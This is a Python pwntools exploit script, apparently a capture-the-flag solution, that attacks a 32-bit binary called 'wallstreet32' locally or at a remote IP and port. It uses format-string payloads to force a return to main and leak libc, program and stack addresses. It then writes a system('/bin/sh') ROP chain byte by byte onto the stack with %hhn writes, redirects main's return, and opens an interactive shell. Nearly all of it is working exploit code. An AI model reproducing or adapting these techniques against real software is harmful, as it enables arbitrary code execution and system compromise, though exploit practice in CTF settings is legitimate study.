#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="i386", os="linux")
context.log_level = 'error'

def tohex(val, nbits):
  return hex((val + (1 << nbits)) % (1 << nbits))


exe = ELF('./wallstreet32')
libc = ELF('./libc.so.6')

if args.REMOTE:
  host, port = "143.198.127.103", "42006"

print('trying to do a ret2main an to have good stack configuration...')
count = 0
# first we do a little bruteforce for waiting the good stack configuration, and trying a ret2main
while (True):
  if args.REMOTE:
    p = remote(host,port)
  else:
    p = process(exe.path)
  p.sendlineafter('stonks!\n','1')
  p.sendlineafter('see?\n', '47')
  payload = '%c'*84+'%220c'+'%hhn'+'%c'*3+'%*\n'+'%c'*18+'%119c'+'%hhn'+'%c'+'%*\n'+'%c'+'%*\n'
  p.sendlineafter('token?\n', payload)
  p.recvuntil('token:\n', drop=True)

  p.readuntil('%',drop=True)
  leak2 = int(p.recvuntil('\n',drop=True),10)
  libc.address = (0x100000000+leak2) - 0x1e5000

  p.readuntil('%',drop=True)
  leak1 = int(p.recvuntil('\n',drop=True),10)
  progbase = leak1 - 0x15f0

  p.readuntil('%',drop=True)
  leak3 = int(p.recvuntil('\n',drop=True),10)

  try:
    # if we received back stonks string, the ret2main was successfull
    out = p.recvuntil('stonks!\n', timeout=3)
    break
  except:
    count +=1
    print('try ret2main: '+str(count))
    p.close()

print('ret2main success')
print('prog base = '+tohex(progbase,32))
print('libc base = '+tohex(libc.address,32))
print('leak stack = '+tohex(leak3,32))


low0 = (leak3 - 0x1d0) & 0xffff  # address on stack we want to write

p.sendline('1')
p.sendlineafter('see?\n', '1')

# first we setup stack pointers
payload = '%c'*76+'%'+str(low0-76)+'c'+'%hn'+'%c'*18+'%218c'+'%hhn'
payload += '%c'*31+'%'+str(0x40)+'c'+'%hhn'
payload += 'Cc'

p.sendlineafter('token?\n', payload)
p.recvuntil('Cc', drop=True)
p.sendlineafter('see?\n', '1')

# our rop
rop = p32(libc.symbols['system'])+p32(libc.symbols['exit'])+p32(next(libc.search('/bin/sh')))

rop = bytes(rop)

count = 0

# stack offset where we will write our rop
offset = 0xc0

print('now sending rop bytes...')
while (count<len(rop)):
  # 1st round write index where we want to write in stack pointer
  payload = '%'+str(count+offset)+'c'+'%98$hhn'+'%'+str((0x100-(count+offset))+0x67)+'c'+'%131$hhnCc'
  p.sendlineafter('token?\n', payload)
  p.recvuntil('Cc', drop=True)
  p.sendlineafter('see?\n', '1')

  # second round, write out rop byte to this index
  if ord(rop[count:count+1]) == 0:
    payload = '%'+str(0x67)+'c%131$hhn'+'%'+str(0x99)+'c'+'%122$hhnCc'
  else:
    payload = '%'+str(0x67)+'c%131$hhn'+'%'+str(0x99)+'c'+'%'+str(ord(rop[count:count+1]))+'c%122$hhnCc'
  p.sendlineafter('token?\n', payload)
  p.recvuntil('Cc', drop=True)
  p.sendlineafter('see?\n', '1')
  print('count='+str(count))
  count+=1

# now we modify ecx address on stack that will be popper by main before return, to fall on our return address (lea esp,[ecx-4] / ret  at end of main)
print('now sending rop LSB address..')

payload = '%98$hhn'+'%'+str(0x67)+'c'+'%131$hhnCc'
p.sendlineafter('token?\n', payload)
p.recvuntil('Cc', drop=True)
p.sendlineafter('see?\n', '1')

payload = '%'+str(0x67)+'c%131$hhn'+'%'+str(0x99+offset+4)+'c%122$hhnCc'
p.sendlineafter('token?\n', payload)
p.recvuntil('Cc', drop=True)
p.sendlineafter('see?\n', '1')


p.sendlineafter('token?\n','%c')

p.interactive()


